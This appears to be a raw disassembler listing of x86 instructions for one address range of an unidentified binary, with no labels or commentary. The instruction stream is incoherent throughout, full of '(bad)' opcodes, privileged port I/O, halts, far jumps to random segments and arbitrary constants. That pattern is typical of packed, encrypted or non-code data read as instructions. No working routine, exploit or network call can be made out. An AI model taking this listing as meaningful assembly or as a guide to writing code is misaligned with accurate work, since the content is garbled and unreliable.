  40c211:	mov    BYTE PTR [edi+0x6bf56fbd],dl
  40c217:	aas    
  40c218:	mov    dh,0x3a
  40c21a:	addr16 mov al,0x1f
  40c21d:	mov    ecx,0x3a4e9ef1
  40c222:	ins    DWORD PTR es:[edi],dx
  40c223:	icebp  
  40c224:	mov    cl,0x20
  40c226:	test   DWORD PTR [edx+ebx*4],0x7fbe2326
  40c22d:	push   esi
  40c22e:	pushf  
  40c22f:	push   edx
  40c230:	jae    0x40c224
  40c232:	sbb    bl,BYTE PTR [ebx+eiz*1+0x25]
  40c236:	mov    BYTE PTR [ecx+0x26],dl
  40c239:	jmp    FWORD PTR [edi]
  40c23b:	jle    0x40c223
  40c23d:	loopne 0x40c241
  40c23f:	lock or DWORD PTR [ebx],edx
  40c242:	mov    ah,0xfa
  40c244:	clc    
  40c245:	inc    eax
  40c246:	mov    ds:0x24139540,eax
  40c24b:	nop
  40c24c:	push   ecx
  40c24d:	mov    DWORD PTR [ecx-0x39],edi
  40c250:	sbb    DWORD PTR [ecx+0x3d],esp
  40c253:	hlt    
  40c254:	pushw  cs
  40c256:	out    dx,al
  40c257:	push   ebp
  40c258:	mov    DWORD PTR [esi-0x7f80c51f],edi
  40c25e:	cmp    al,0xfd
  40c260:	stos   DWORD PTR es:[edi],eax
  40c261:	sbb    eax,0xdbe2e8b6
  40c266:	jle    0x40c1f7
  40c268:	sub    esi,ecx
  40c26a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c26b:	inc    ecx
  40c26c:	adc    bl,BYTE PTR [ebx]
  40c26e:	hlt    
  40c26f:	and    eax,0xc1aadb30
  40c274:	fstp   DWORD PTR [ecx]
  40c276:	mov    al,ds:0xd7eb8ee8
  40c27b:	out    dx,al
  40c27c:	pushf  
  40c27d:	int    0xb3
  40c27f:	loope  0x40c28e
  40c281:	sbb    bh,ch
  40c283:	ss sbb eax,0x2382a21d
  40c289:	ja     0x40c2ff
  40c28b:	call   0x181a:0x470f199d
  40c292:	sub    ch,BYTE PTR ds:0x376e5c21
  40c298:	and    eax,0xaf958ab7
  40c29d:	or     esi,0xe
  40c2a0:	mov    cl,0x99
  40c2a2:	hlt    
  40c2a3:	popa   
  40c2a4:	cdq    
  40c2a5:	sbb    DWORD PTR [edx-0x4],ebp
  40c2a8:	and    DWORD PTR [eax+0x1380c5be],eax
  40c2ae:	sub    esp,DWORD PTR [ebp+0xd]
  40c2b1:	std    
  40c2b2:	shl    DWORD PTR [edx-0x22],1
  40c2b5:	push   0xfffffff6
  40c2b7:	push   ebx
  40c2b8:	dec    esi
  40c2b9:	xchg   DWORD PTR [esi+0x1],ecx
  40c2bc:	mov    al,ds:0x214593eb
  40c2c1:	sbb    bh,dl
  40c2c3:	cmp    BYTE PTR [esi+0x22],ah
  40c2c6:	mov    cl,0xac
  40c2c8:	jmp    FWORD PTR [ebx+0x782312cd]
  40c2ce:	xor    DWORD PTR [ebx],edi
  40c2d0:	jmp    0x19a07f69
  40c2d5:	stos   DWORD PTR es:[edi],eax
  40c2d6:	mov    esp,0x8ccb9ffb
  40c2db:	out    0xb7,al
  40c2dd:	add    ecx,DWORD PTR [edi+0x2b]
  40c2e0:	push   cs
  40c2e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2e2:	imul   eax,DWORD PTR [edx+0x2b],0x25
  40c2e6:	push   edi
  40c2e7:	mov    ah,0x79
  40c2e9:	(bad)  
  40c2ea:	mov    al,0xfe
  40c2ec:	inc    edx
  40c2ed:	mov    bl,0xc
  40c2ef:	aad    0x43
  40c2f1:	lahf   
  40c2f2:	sub    eax,DWORD PTR [edi]
  40c2f4:	push   esi
  40c2f5:	pop    es
  40c2f6:	icebp  
  40c2f7:	add    edx,edi
  40c2f9:	enter  0x2af1,0x9b
  40c2fd:	shl    edi,1
  40c2ff:	sub    edi,ecx
  40c301:	mov    ecx,0x230a7ea7
  40c306:	cli    
  40c307:	push   edx
  40c308:	jl     0x40c2a2
  40c30a:	mov    al,0xd2
  40c30c:	and    DWORD PTR [ecx],ebx
  40c30e:	xchg   ebx,eax
  40c30f:	shld   DWORD PTR [edi+0x5d375c99],edi,0x51
  40c317:	call   0xc82a:0x628a892
  40c31e:	fs cmp ecx,esi
  40c321:	push   ebp
  40c322:	pop    edx
  40c323:	adc    edi,DWORD PTR [edx-0x6585c10c]
  40c329:	push   edi
  40c32a:	ror    edi,0x11
  40c32d:	xchg   ebp,eax
  40c32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c32f:	push   ebp
  40c330:	push   ss
  40c331:	cdq    
  40c332:	mov    ah,0x85
  40c334:	dec    edi
  40c335:	dec    ecx
  40c336:	mov    ch,0xfa
  40c338:	rcr    BYTE PTR [ebx-0x1cd31d7e],cl
  40c33e:	ins    BYTE PTR es:[edi],dx
  40c33f:	cmc    
  40c340:	das    
  40c341:	cmp    al,0x51
  40c343:	into   
  40c344:	aas    
  40c345:	and    eax,0xd5ae7d65
  40c34a:	adc    dh,al
  40c34c:	out    0xa1,eax
  40c34e:	dec    ebp
  40c34f:	inc    edi
  40c350:	add    edx,DWORD PTR [ecx+0x5ff65bff]
  40c356:	das    
  40c357:	xchg   edi,eax
  40c358:	fwait
  40c359:	call   0xcd117c48
  40c35e:	mov    al,ds:0xb7da7b4a
  40c363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c364:	es pop ebp
  40c366:	lahf   
  40c367:	sti    
  40c368:	cmp    BYTE PTR [edi-0x27c031f6],0xad
  40c36f:	cmp    ebx,edi
  40c371:	in     al,dx
  40c372:	clc    
  40c373:	or     al,0x0
  40c375:	scas   al,BYTE PTR es:[edi]
  40c376:	push   ebx
  40c377:	loopne 0x40c3c5
  40c379:	aaa    
  40c37a:	call   ebp
  40c37c:	push   ebx
  40c37d:	idiv   DWORD PTR [edi+0x1dd23afb]
  40c383:	adc    cl,bl
  40c385:	pop    eax
  40c386:	push   edx
  40c387:	xor    DWORD PTR [edx-0x5061b8d8],ebp
  40c38d:	sub    al,0xe4
  40c38f:	inc    edx
  40c390:	jmp    0xe346f939
  40c395:	xor    BYTE PTR [esi+ecx*4],ch
  40c398:	cs cdq 
  40c39a:	cmc    
  40c39b:	push   ecx
  40c39c:	shr    DWORD PTR [eax+0x7d3d525f],cl
  40c3a2:	in     al,0xdb
  40c3a4:	mov    edi,0x13ccdb66
  40c3a9:	out    0x5b,al
  40c3ab:	push   0x843b1870
  40c3b0:	fmul   st,st(7)
  40c3b2:	jmp    0x1c7c31a0
  40c3b7:	push   ecx
  40c3b8:	adc    DWORD PTR [ebx],esi
  40c3ba:	aam    0x98
  40c3bc:	xor    eax,0x96c010a0
  40c3c1:	ss stc 
  40c3c3:	inc    esp
  40c3c4:	pop    ebx
  40c3c5:	gs fld st(4)
  40c3c8:	aas    
  40c3c9:	fwait
  40c3ca:	and    al,0xbd
  40c3cc:	mov    eax,0x7d0e121c
  40c3d1:	icebp  
  40c3d2:	jbe    0x40c3a2
  40c3d4:	cmp    BYTE PTR [edx+0x71728ce6],bh
  40c3da:	mov    ebx,0x8d5330c5
  40c3df:	pushf  
  40c3e0:	outs   dx,BYTE PTR ds:[esi]
  40c3e1:	loope  0x40c374
  40c3e3:	test   esi,0x8f9fe410
  40c3e9:	ins    BYTE PTR es:[edi],dx
  40c3ea:	inc    esi
  40c3eb:	cmp    BYTE PTR [eax],cl
  40c3ed:	push   edi
  40c3ee:	sti    
  40c3ef:	inc    ebp
  40c3f0:	int    0x88
  40c3f2:	cmp    eax,0xac63bd45
  40c3f7:	push   cs
  40c3f8:	ins    DWORD PTR es:[edi],dx
  40c3f9:	(bad)  
  40c3fa:	imul   eax,DWORD PTR [ebp+0x2fea7020],0xffffff93
  40c401:	sbb    eax,0x9acc4672
  40c406:	inc    esp
  40c407:	xchg   esp,eax
  40c408:	and    esi,ecx
  40c40a:	xor    al,0xf
  40c40c:	pop    ss
  40c40d:	int3   
  40c40e:	loop   0x40c3fa
  40c410:	push   0x6a564ded
  40c415:	dec    ecx
  40c416:	das    
  40c417:	(bad)  
  40c418:	push   ecx
  40c419:	xchg   ebp,eax
  40c41a:	dec    ebx
  40c41b:	lahf   
  40c41c:	lock not ecx
  40c41f:	cld    
  40c420:	xchg   ebx,eax
  40c421:	in     eax,0x95
  40c423:	dec    ebp
  40c424:	xor    dh,BYTE PTR [ebp+0x4c]
  40c427:	adc    edi,ebp
  40c429:	mov    ecx,DWORD PTR [eax+0x636a32a0]
  40c42f:	ror    esp,1
  40c431:	neg    eax
  40c433:	inc    ebx
  40c434:	mov    BYTE PTR [ebx+0xfaebd75],al
  40c43a:	addr16 dec ebx
  40c43c:	sub    ebp,0x9864db84
  40c442:	es xchg ebp,eax
  40c444:	jmp    0xa48e65b7
  40c449:	or     BYTE PTR [edi+0x13],bl
  40c44c:	div    ebp
  40c44e:	and    eax,0xd03bcdd5
  40c453:	pop    ds
  40c454:	mov    ds:0x188d882f,al
  40c459:	hlt    
  40c45a:	adc    BYTE PTR [eax],ch
  40c45c:	ret    
  40c45d:	sbb    ah,ch
  40c45f:	lods   al,BYTE PTR ds:[esi]
  40c460:	or     DWORD PTR [ebp+0x38],esi
  40c463:	test   DWORD PTR [ebx],esp
  40c465:	stos   DWORD PTR es:[edi],eax
  40c466:	cwde   
  40c467:	sar    DWORD PTR [ebx+ebp*4-0x1933d9d1],0x46
  40c46f:	cmp    eax,0x55b5465b
  40c475:	loope  0x40c47d
  40c477:	add    esi,DWORD PTR [esi]
  40c479:	add    esp,esp
  40c47b:	stos   DWORD PTR es:[edi],eax
  40c47c:	sahf   
  40c47d:	xor    BYTE PTR [edi],0xe0
  40c480:	lods   eax,DWORD PTR ds:[esi]
  40c481:	rol    BYTE PTR ds:0xbfd0695,1
  40c487:	push   edi
  40c488:	pop    edi
  40c489:	sub    al,0x39
  40c48b:	popa   
  40c48c:	mov    dl,0x70
  40c48e:	hlt    
  40c48f:	leave  
  40c490:	mov    ds:0xcd57ec9,al
  40c495:	adc    DWORD PTR [ebx+ebp*2-0x2dfd75c1],0x12c9de6
  40c4a0:	iret   
  40c4a1:	imul   ebp,DWORD PTR [ebx-0x5],0xffffff8a
  40c4a5:	push   ds
  40c4a6:	dec    eax
  40c4a7:	and    BYTE PTR [ecx-0x68],dl
  40c4aa:	fimul  DWORD PTR [esi]
  40c4ac:	cdq    
  40c4ad:	pop    DWORD PTR [esi+0x5f9f27ac]
  40c4b3:	mov    bh,0x10
  40c4b5:	stos   DWORD PTR es:[edi],eax
  40c4b6:	fs repz dec esi
  40c4b9:	add    DWORD PTR [esi+0x45],eax
  40c4bc:	cmp    BYTE PTR [esp+eiz*2-0x31],ah
  40c4c0:	test   DWORD PTR [edi-0x317431fc],0x4a89a025
  40c4ca:	jg     0x40c4dc
  40c4cc:	clc    
  40c4cd:	push   ebx
  40c4ce:	addr16 or eax,0x14936231
  40c4d4:	stos   BYTE PTR es:[edi],al
  40c4d5:	sub    al,BYTE PTR [esi]
  40c4d7:	fcmovnu st,st(5)
  40c4d9:	loopne 0x40c4ed
  40c4db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4dc:	lods   al,BYTE PTR es:[esi]
  40c4de:	cmp    edi,DWORD PTR [ecx]
  40c4e0:	ja     0x40c48a
  40c4e2:	in     eax,dx
  40c4e3:	sbb    eax,0xca6e624e
  40c4e8:	add    edx,esi
  40c4ea:	push   ebp
  40c4eb:	rol    DWORD PTR [ecx-0x2c7f47d],cl
  40c4f1:	rcr    DWORD PTR [eax-0x15],0xdb
  40c4f5:	pop    ss
  40c4f6:	(bad)  
  40c4f7:	xlat   BYTE PTR ds:[ebx]
  40c4f8:	xor    BYTE PTR [eax+0x4b89d2a],0x83
  40c4ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c500:	mov    ch,0xf2
  40c502:	(bad)  
  40c503:	mov    WORD PTR [ebp-0x26],cs
  40c506:	pop    esi
  40c507:	test   DWORD PTR [edi],0x44fe784d
  40c50d:	jb     0x40c555
  40c50f:	out    dx,eax
  40c510:	and    eax,0x86434974
  40c515:	mov    ecx,0x70130f8
  40c51a:	retf   
  40c51b:	jmp    0x40c4db
  40c51d:	sbb    eax,0xcf59a09a
  40c522:	jp     0x40c4b1
  40c524:	add    eax,0xabe0f19e
  40c529:	mov    ds:0xb2fdf8b4,eax
  40c52e:	xchg   edi,eax
  40c52f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c530:	mov    ebx,0x570f29d4
  40c535:	and    BYTE PTR [ecx+0x1e],bh
  40c538:	add    eax,0x66c59d1c
  40c53d:	in     eax,0x9f
  40c53f:	icebp  
  40c540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c541:	mov    al,ds:0x594f8baa
  40c546:	test   DWORD PTR [ebx],0xa5280a7a
  40c54c:	or     eax,0x7aa41add
  40c551:	sbb    sp,ax
  40c554:	enter  0xd000,0x2d
  40c558:	in     eax,dx
  40c559:	mov    ch,0xbf
  40c55b:	adc    ch,BYTE PTR [eax]
  40c55d:	xchg   BYTE PTR [eax],dl
  40c55f:	add    ah,BYTE PTR [eax]
  40c561:	add    BYTE PTR [ecx-0x187e9f91],bh
  40c567:	enter  0x70fd,0x70
  40c56b:	sub    DWORD PTR [edx],esi
  40c56d:	add    esp,DWORD PTR [ebx+0x29]
  40c570:	into   
  40c571:	test   DWORD PTR [ebx-0x6a],edx
  40c574:	sbb    al,0xcd
  40c576:	nop
  40c577:	out    dx,eax
  40c578:	sub    eax,0x746ef4df
  40c57d:	adc    eax,0xb2b223ce
  40c582:	push   esi
  40c583:	fwait
  40c584:	and    ebx,DWORD PTR [edx]
  40c586:	mov    dh,0x87
  40c588:	sub    al,0x14
  40c58a:	int    0xbe
  40c58c:	and    eax,0xec5fb032
  40c591:	xchg   BYTE PTR [edx],dl
  40c593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c594:	jbe    0x40c5a0
  40c596:	mov    ebx,0x38420001
  40c59b:	jg     0x40c55d
  40c59d:	sbb    al,dh
  40c59f:	ds mov eax,0x22269bf
  40c5a5:	mov    al,0x77
  40c5a7:	mov    eax,0x23fdee8f
  40c5ac:	mov    edi,0x867959cf
  40c5b1:	outs   dx,BYTE PTR ds:[esi]
  40c5b2:	inc    eax
  40c5b3:	ds cld 
  40c5b5:	(bad)  
  40c5b6:	jnp    0x40c5ab
  40c5b8:	rcl    BYTE PTR [ecx+0x1],cl
  40c5bb:	and    edi,DWORD PTR [esi-0x2e2a6b88]
  40c5c1:	or     bh,bh
  40c5c3:	xor    al,0x2e
  40c5c5:	push   ebx
  40c5c6:	mov    BYTE PTR [edi+0x65880b8a],dh
  40c5cc:	push   esp
  40c5cd:	push   ds
  40c5ce:	or     al,0x1e
  40c5d0:	mov    dh,0x14
  40c5d2:	ja     0x40c5fb
  40c5d4:	mov    ebx,0x27d778c1
  40c5d9:	or     BYTE PTR [ecx-0x3dfca90b],bl
  40c5df:	xor    bh,BYTE PTR [eax]
  40c5e1:	out    dx,eax
  40c5e2:	add    ecx,DWORD PTR [edx-0x34ed1b45]
  40c5e8:	xor    eax,0xcf4da3b9
  40c5ed:	pop    ecx
  40c5ee:	into   
  40c5ef:	pop    ds
  40c5f0:	mov    ds:0x5b0cfda0,eax
  40c5f5:	sbb    al,0xee
  40c5f7:	push   ecx
  40c5f8:	sub    al,0x52
  40c5fa:	rcl    BYTE PTR [ecx],0x91
  40c5fd:	push   0xffa4ef1f
  40c602:	mov    esp,0x51ee5ea0
  40c607:	loopne 0x40c5d2
  40c609:	and    al,0x2a
  40c60b:	mov    ebx,ebx
  40c60d:	dec    sp
  40c60f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c610:	adc    al,0x81
  40c612:	pop    es
  40c613:	ret    0xc772
  40c616:	mov    ebp,0x252cb04
  40c61b:	int    0xe8
  40c61d:	gs pop edi
  40c61f:	lock pushf 
  40c621:	out    dx,al
  40c622:	ror    BYTE PTR [esi+0x43],cl
  40c625:	popa   
  40c626:	retf   
  40c627:	mov    bl,0xff
  40c629:	fild   WORD PTR [edx+0x27]
  40c62c:	lock push cs
  40c62e:	imul   ecx,DWORD PTR [edi+0x26],0x17
  40c632:	xor    DWORD PTR [ebx+esi*4],ebx
  40c635:	fcomp  DWORD PTR [edi-0x4514e4e4]
  40c63b:	add    ah,0xb0
  40c63e:	dec    eax
  40c63f:	les    ebp,FWORD PTR [ebx-0x35]
  40c642:	fs iret 
  40c644:	push   edi
  40c645:	test   DWORD PTR [eax-0xec6db4],eax
  40c64b:	fistp  WORD PTR [ebx]
  40c64d:	mov    ebp,0x68aacb5a
  40c652:	adc    eax,0xa148ad81
  40c657:	iret   
  40c658:	dec    esi
  40c659:	(bad)  
  40c65a:	fld    DWORD PTR [ebp-0x6c8fdf9e]
  40c660:	aam    0x0
  40c662:	leave  
  40c663:	lods   al,BYTE PTR ds:[esi]
  40c664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c666:	adc    esp,edi
  40c668:	adc    dh,BYTE PTR [ebp-0x2c6672a7]
  40c66e:	icebp  
  40c66f:	fdiv   QWORD PTR [ecx-0x3ed0067d]
  40c675:	and    eax,0x894d36bb
  40c67a:	adc    DWORD PTR [edx-0x59],0x4cabab5c
  40c681:	stos   BYTE PTR es:[edi],al
  40c682:	and    dh,BYTE PTR [esi+0x10]
  40c685:	push   edi
  40c686:	not    BYTE PTR [edx+0x5c6557a]
  40c68c:	add    eax,0xc543ebca
  40c691:	fisttp QWORD PTR [esi-0x80]
  40c694:	cli    
  40c695:	les    ebp,FWORD PTR [esi+0x0]
  40c698:	pop    ecx
  40c699:	call   0x3c1147e6
  40c69e:	ins    DWORD PTR es:[edi],dx
  40c69f:	mov    ds:0x4f81d145,eax
  40c6a4:	out    dx,eax
  40c6a5:	ins    BYTE PTR es:[edi],dx
  40c6a6:	dec    ebp
  40c6a7:	jo     0x40c66e
  40c6a9:	(bad)  
  40c6aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6ab:	std    
  40c6ac:	hlt    
  40c6ad:	xor    dh,bh
  40c6af:	push   ebp
  40c6b0:	test   bl,ch
  40c6b2:	ins    BYTE PTR es:[edi],dx
  40c6b3:	fidivr DWORD PTR [edx+edi*4+0x15]
  40c6b7:	fs dec ebx
  40c6b9:	jne    0x40c6de
  40c6bb:	mov    es:0xe84686b,al
  40c6c1:	mov    WORD PTR [eax+0x24357e1],ss
  40c6c7:	jl     0x40c694
  40c6c9:	fbld   TBYTE PTR [esi-0x7f]
  40c6cc:	push   ebp
  40c6cd:	aaa    
  40c6ce:	mov    ds:0x471247ba,al
  40c6d3:	imul   edx,DWORD PTR [esi],0xe851591d
  40c6d9:	test   BYTE PTR ds:0xa26c3cfb,ah
  40c6df:	ret    0xd5ea
  40c6e2:	loop   0x40c6e0
  40c6e4:	(bad)  
  40c6e5:	mov    cl,BYTE PTR [ecx-0x9]
  40c6e8:	sub    dl,BYTE PTR [eax-0x60]
  40c6eb:	lahf   
  40c6ec:	xor    ecx,edi
  40c6ee:	dec    esp
  40c6ef:	fbstp  TBYTE PTR [esi-0x9]
  40c6f2:	inc    esp
  40c6f3:	push   cs
  40c6f4:	and    DWORD PTR [ebp+0x8],ebx
  40c6f7:	int    0xdb
  40c6f9:	test   eax,0xb1a205a7
  40c6fe:	shl    DWORD PTR [eax+0x41c47c93],cl
  40c704:	lds    ebp,FWORD PTR [ebx+0x39b3fa8e]
  40c70a:	imul   ecx,DWORD PTR [ecx],0x7c
  40c70d:	(bad)  
  40c70e:	adc    BYTE PTR gs:0x8e1563d2,ah
  40c715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c716:	adc    al,0xd0
  40c718:	mov    dl,0xc9
  40c71a:	ja     0x40c6cf
  40c71c:	test   bl,al
  40c71e:	shl    ch,1
  40c720:	xor    al,0x9e
  40c722:	jp     0x40c6f0
  40c724:	aam    0xe7
  40c726:	jno    0x40c6ef
  40c728:	je     0x40c78c
  40c72a:	lock jo 0x40c6ca
  40c72d:	mov    eax,ds:0x5b93197
  40c732:	push   eax
  40c733:	jecxz  0x40c6d2
  40c735:	inc    ebp
  40c736:	rol    DWORD PTR [ecx-0x5d],0x12
  40c73a:	mov    eax,ds:0x9bbb1b9a
  40c73f:	loopne 0x40c7c0
  40c741:	pop    edx
  40c742:	out    dx,al
  40c743:	ror    DWORD PTR [edx-0x9],cl
  40c746:	adc    al,0xd2
  40c748:	into   
  40c749:	dec    esp
  40c74a:	stos   DWORD PTR es:[edi],eax
  40c74b:	std    
  40c74c:	aad    0x7e
  40c74e:	imul   edx,DWORD PTR [ebx+ecx*1+0x1dd21ef],0x6c
  40c756:	je     0x40c78f
  40c758:	mov    edx,0x40919857
  40c75d:	dec    edx
  40c75e:	pop    ecx
  40c75f:	xchg   ebx,eax
  40c760:	or     BYTE PTR ds:0xa512340e,0xd8
  40c767:	jno    0x40c778
  40c769:	test   dl,cl
  40c76b:	ret    0x52a9
  40c76e:	call   0x536cd540
  40c773:	mov    ch,bh
  40c775:	fidivr WORD PTR [eax-0x5ea93a13]
  40c77b:	stc    
  40c77c:	clc    
  40c77d:	xor    eax,0xf6cae9cb
  40c782:	sbb    BYTE PTR [edx+0x14ab1534],cl
  40c788:	in     eax,dx
  40c789:	das    
  40c78a:	cmp    eax,eax
  40c78c:	push   esi
  40c78d:	out    dx,al
  40c78e:	cmp    dl,BYTE PTR [ebx-0x55dc7f42]
  40c794:	add    al,0x3f
  40c796:	stc    
  40c797:	pcmpgtd mm2,QWORD PTR [ebp-0xd]
  40c79b:	xor    bl,al
  40c79d:	adc    al,0x91
  40c79f:	xchg   bh,dl
  40c7a1:	push   ebx
  40c7a2:	mov    esp,0xa9692000
  40c7a7:	int    0x24
  40c7a9:	popa   
  40c7aa:	push   0xffffffb0
  40c7ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7ad:	push   0x77902e8
  40c7b2:	stos   DWORD PTR es:[edi],eax
  40c7b3:	scas   eax,DWORD PTR es:[edi]
  40c7b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7b5:	pop    ebx
  40c7b6:	imul   edx,DWORD PTR [edx],0xffffffa8
  40c7b9:	fcom   QWORD PTR [eax+0xe7bea3b]
  40c7bf:	or     dh,bl
  40c7c1:	call   0x5a3f488e
  40c7c6:	push   edi
  40c7c7:	push   es
  40c7c8:	xor    BYTE PTR [eax-0x7806fbcf],dh
  40c7ce:	xchg   esi,eax
  40c7cf:	sbb    ebx,DWORD PTR [ecx-0x3af17e1d]
  40c7d5:	jo     0x40c803
  40c7d7:	cmc    
  40c7d8:	sub    DWORD PTR [edi+0x47],edi
  40c7db:	mov    esi,0x378b2875
  40c7e0:	ret    0x3a81
  40c7e3:	mov    ebx,0xc57290aa
  40c7e8:	jge    0x40c7ed
  40c7ea:	in     al,dx
  40c7eb:	jnp    0x40c7b7
  40c7ed:	mov    esi,0xf2a9aefb
  40c7f2:	aas    
  40c7f3:	out    0x7,eax
  40c7f5:	dec    eax
  40c7f6:	adc    ebx,esi
  40c7f8:	in     eax,0xa3
  40c7fa:	dec    ecx
  40c7fb:	leave  
  40c7fc:	repz sub BYTE PTR [edi-0x57],bh
  40c800:	shl    BYTE PTR [ecx-0x3e7889c1],0xe
  40c807:	xchg   ecx,eax
  40c808:	retf   0xf096
  40c80b:	sar    BYTE PTR [edx],cl
  40c80d:	repnz (bad) 
  40c80f:	xor    DWORD PTR [ebp-0x2e607cba],esi
  40c815:	fwait
  40c816:	es inc edi
  40c818:	sbb    bl,BYTE PTR ds:0x80608b1
  40c81e:	fisttp WORD PTR [edx-0x58]
  40c821:	pushf  
  40c822:	sbb    dl,al
  40c824:	dec    ecx
  40c825:	outs   dx,BYTE PTR ds:[esi]
  40c826:	fisub  DWORD PTR ds:0x637cb816
  40c82c:	and    al,0x12
  40c82e:	data16 aas 
  40c830:	adc    eax,0xe9ecf470
  40c835:	push   0xa3c88e3d
  40c83a:	pop    eax
  40c83b:	loope  0x40c7c2
  40c83d:	mov    cl,0x28
  40c83f:	iret   
  40c840:	gs sub ebp,ecx
  40c843:	outs   dx,DWORD PTR ds:[esi]
  40c844:	jmp    0x40c88c
  40c846:	stos   DWORD PTR es:[edi],eax
  40c847:	sbb    eax,0x38831111
  40c84c:	ins    DWORD PTR es:[edi],dx
  40c84d:	retf   0x1606
  40c850:	scas   eax,DWORD PTR es:[edi]
  40c851:	xchg   edx,eax
  40c852:	bound  edx,QWORD PTR [edx]
  40c854:	xchg   DWORD PTR [esp+edi*1],ebx
  40c857:	dec    eax
  40c858:	setnp  dl
  40c85b:	es mov ebx,0xc30adc68
  40c861:	pop    eax
  40c862:	inc    eax
  40c863:	jnp    0x40c8bb
  40c865:	inc    ebx
  40c866:	pop    dx
  40c868:	pop    es
  40c869:	aas    
  40c86a:	mov    ss,WORD PTR [esi-0xcde8444]
  40c870:	adc    eax,0x57758ec6
  40c875:	(bad)  
  40c877:	xchg   ebp,eax
  40c878:	lock xlat BYTE PTR ds:[ebx]
  40c87a:	ret    
  40c87b:	out    dx,eax
  40c87c:	pop    edi
  40c87d:	ficomp WORD PTR [esi]
  40c87f:	ret    0x8bfc
  40c882:	stos   BYTE PTR es:[edi],al
  40c883:	add    dl,dl
  40c885:	sbb    esp,ebx
  40c887:	mov    dl,BYTE PTR [edx+0x35]
  40c88a:	mov    ebp,0x587027d8
  40c88f:	pusha  
  40c890:	dec    DWORD PTR [edi]
  40c892:	sbb    edi,DWORD PTR [ebx+edx*1-0x45]
  40c896:	ja     0x40c829
  40c898:	(bad)  
  40c899:	xchg   esi,eax
  40c89a:	dec    esi
  40c89b:	shl    DWORD PTR [ebp+0x7c834a24],cl
  40c8a1:	sub    BYTE PTR [edi+0x6361208f],bl
  40c8a7:	xchg   BYTE PTR [ecx],ch
  40c8a9:	jg     0x40c899
  40c8ab:	(bad)  
  40c8ad:	mov    cl,0x27
  40c8af:	lds    edi,FWORD PTR [eax+edi*1-0x3fd75e84]
  40c8b6:	xor    DWORD PTR [esi],0x2e7ca906
  40c8bc:	sub    bl,bl
  40c8be:	push   ecx
  40c8bf:	out    dx,eax
  40c8c0:	jnp    0x40c922
  40c8c2:	fxch   st(1)
  40c8c4:	sbb    ah,bl
  40c8c6:	pop    edx
  40c8c7:	popa   
  40c8c8:	std    
  40c8c9:	cwde   
  40c8ca:	pop    ebx
  40c8cb:	ds pop ebp
  40c8cd:	lock pop esi
  40c8cf:	mov    ch,0xec
  40c8d1:	inc    eax
  40c8d2:	ss pop eax
  40c8d4:	pop    ebp
  40c8d5:	inc    ebx
  40c8d6:	sti    
  40c8d7:	jl     0x40c90b
  40c8d9:	(bad)  [edi+edi*8]
  40c8dc:	test   eax,0x2dbc2270
  40c8e1:	add    eax,edx
  40c8e3:	xchg   edi,eax
  40c8e4:	cmp    BYTE PTR [ebx+0x2f],bl
  40c8e7:	outs   dx,DWORD PTR ds:[esi]
  40c8e8:	aam    0xa7
  40c8ea:	int    0x21
  40c8ec:	jp     0x40c94d
  40c8ee:	inc    esp
  40c8ef:	into   
  40c8f0:	enter  0xedc8,0x45
  40c8f4:	mov    edx,DWORD PTR [eax+0x21]
  40c8f7:	push   0xffffff9c
  40c8f9:	sti    
  40c8fa:	daa    
  40c8fb:	lds    edi,FWORD PTR [ebp-0x31f17fb3]
  40c901:	pop    ecx
  40c902:	adc    edi,DWORD PTR [edi+eax*4-0x51]
  40c906:	nop
  40c907:	inc    ebp
  40c908:	in     al,dx
  40c909:	popf   
  40c90a:	enter  0x6090,0x79
  40c90e:	inc    esi
  40c90f:	call   0x6f4fd78c
  40c914:	bound  edi,QWORD PTR [ecx+0x55]
  40c917:	sar    DWORD PTR [ebp+0x14],0x6f
  40c91b:	dec    edi
  40c91c:	daa    
  40c91d:	out    0xb3,al
  40c91f:	fst    DWORD PTR ds:0xd89dc0de
  40c925:	jmp    0x53a9:0x978ceecd
  40c92c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c92d:	shr    edx,0x2
  40c930:	jecxz  0x40c8ef
  40c932:	sbb    esi,DWORD PTR [edx+0x3d]
  40c935:	mov    ebp,0x8036531f
  40c93a:	mov    ds:0x54fdc1f,eax
  40c93f:	mov    al,0x66
  40c941:	test   BYTE PTR [eax+0x7a167c7f],ah
  40c947:	xchg   edi,eax
  40c948:	lea    edx,[edx]
  40c94a:	fisttp WORD PTR [edx+ebx*2+0xc241226]
  40c951:	adc    bh,BYTE PTR ds:0x88cd7a7
  40c957:	std    
  40c958:	xchg   ebx,eax
  40c959:	pop    ebp
  40c95a:	sahf   
  40c95b:	lahf   
  40c95c:	mov    DWORD PTR [ecx],ecx
  40c95e:	mov    edx,0xf54c1dc
  40c963:	gs cmc 
  40c965:	cmp    edi,DWORD PTR [eax-0x6249c6f4]
  40c96b:	pop    eax
  40c96c:	adc    DWORD PTR [edx+0x4f],edi
  40c96f:	and    dl,BYTE PTR [ebx]
  40c971:	(bad)  
  40c972:	or     BYTE PTR [ebx],bl
  40c974:	hlt    
  40c975:	pop    esi
  40c976:	mov    esi,0xe9dbd41a
  40c97b:	pop    eax
  40c97c:	mov    dl,BYTE PTR [ecx]
  40c97e:	std    
  40c97f:	std    
  40c980:	pusha  
  40c981:	scas   al,BYTE PTR es:[edi]
  40c982:	sbb    BYTE PTR [edx],cl
  40c984:	out    0x2e,al
  40c986:	xchg   esi,eax
  40c987:	js     0x40c911
  40c989:	test   eax,0x3a4fbd52
  40c98e:	cwde   
